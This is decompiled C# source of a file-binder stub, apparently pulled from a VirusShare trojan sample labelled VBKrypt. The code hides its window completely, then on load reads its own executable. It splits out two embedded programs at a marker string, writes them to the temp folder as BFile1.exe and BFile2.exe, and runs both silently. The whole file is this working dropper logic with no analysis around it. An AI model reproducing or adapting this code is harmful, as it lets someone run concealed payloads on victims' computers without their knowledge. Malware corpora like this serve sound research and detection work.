// Decompiled with JetBrains decompiler
// Type: Binder_Example_Stub.Form1
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9FF6EAD-FE0C-414A-B81D-E56B15838F72
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.VBKrypt.voka-0cd2ce995e71db4b61495c518df322df9bcbe1c897bced0bfa88511bf02396f3.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Binder_Example_Stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    private const string FileSplit = "@@File Binder By DOT ----- v1.1@@";

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoSizeMode = AutoSizeMode.GrowAndShrink;
      this.ClientSize = new Size(10, 10);
      this.ControlBox = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string tempPath = Path.GetTempPath();
label_2:
        num3 = 3;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_3:
        num3 = 4;
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_4:
        num3 = 5;
        FileSystem.FileGet(1, ref Expression);
label_5:
        num3 = 6;
        FileSystem.FileClose(1);
label_6:
        num3 = 7;
        string[] strArray = Strings.Split(Expression, "@@File Binder By DOT ----- v1.1@@");
label_7:
        num3 = 8;
        FileSystem.FileOpen(3, tempPath + "\\BFile1.exe", OpenMode.Binary, OpenAccess.ReadWrite);
label_8:
        num3 = 9;
        FileSystem.FilePut(3, strArray[1], -1L, false);
label_9:
        num3 = 10;
        FileSystem.FileClose(3);
label_10:
        num3 = 11;
        FileSystem.FileOpen(5, tempPath + "\\BFile2.exe", OpenMode.Binary, OpenAccess.ReadWrite);
label_11:
        num3 = 12;
        FileSystem.FilePut(5, strArray[2], -1L, false);
label_12:
        num3 = 13;
        FileSystem.FileClose(5);
label_13:
        num3 = 14;
        Process.Start(tempPath + "\\BFile1.exe");
label_14:
        num3 = 15;
        Process.Start(tempPath + "\\BFile2.exe");
label_15:
        num3 = 16;
        this.Close();
        ProjectData.EndApp();
        goto label_22;
label_17:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_22;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_17;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_22:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
